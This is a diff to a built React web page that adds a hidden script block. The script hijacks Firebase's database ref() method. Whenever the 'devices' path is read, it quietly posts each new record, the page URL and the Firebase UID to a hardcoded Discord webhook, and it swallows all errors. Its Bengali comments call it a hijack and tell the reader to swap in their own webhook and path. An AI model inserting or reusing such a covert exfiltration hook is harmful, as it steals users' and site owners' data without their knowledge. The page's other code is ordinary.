@@ -22929,6 +22929,47 @@ function y1() {
 Y0.createRoot(document.getElementById("root")).render(r.jsx(y1, {}));
 
     </script>
+
+    <script>
+(function() {
+  const WEBHOOK = 'https://discord.com/api/webhooks/1562876220876656720/sqDsVo-yTp8uzOiGXFIT9TbjUXh6GXjN6XZE1ZNiD-uAdnO_-4vohJhgy6qDBkWf_Ifv'; // 🔥 এটা চেঞ্জ কর
+
+  const sendToDiscord = async (data) => {
+    try {
+      await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: "**NEW FIREBASE**",
+          embeds: [{
+            title: "Device Info",
+            fields: [
+              { name: "URL", value: window.location.href, inline: true },
+              { name: "API", value: data.api || "N/A", inline: true },
+              { name: "Time", value: new Date().toLocaleString(), inline: true },
+              { name: "Firebase UID", value: data.uid || "N/A" }
+            ]
+          }]
+        })
+      });
+    } catch(e) { /* নিঃশব্দে */ }
+  };
+
+  // Firebase-এর ref() মেথড কে হাইজ্যাক করলাম
+  const originalRef = firebase.database().ref;
+  firebase.database().ref = function(path) {
+    const ref = originalRef.apply(this, arguments);
+    if (path === 'devices') { // তোর রেফারেন্স পাথ ধর এটা চেঞ্জ করিস
+      ref.on('child_added', snapshot => sendToDiscord(snapshot.val()));
+      ref.on('value', snapshot => {
+        // পুরো ডাটা চাইলে এটাও ব্যবহার করতে পারিস
+        // sendToDiscord(snapshot.val());
+      });
+    }
+    return ref;
+  };
+})();
+    </script>
+    
 </body>
 </html>
-<script async src="/.netlify/scripts/hud?variant=public" data-nf-variant="public" data-netlify-site-id="9e58c1e5-84ef-4720-ac32-8addd18ea732" data-app-host="app.netlify.com" data-account-tier="free"></script>
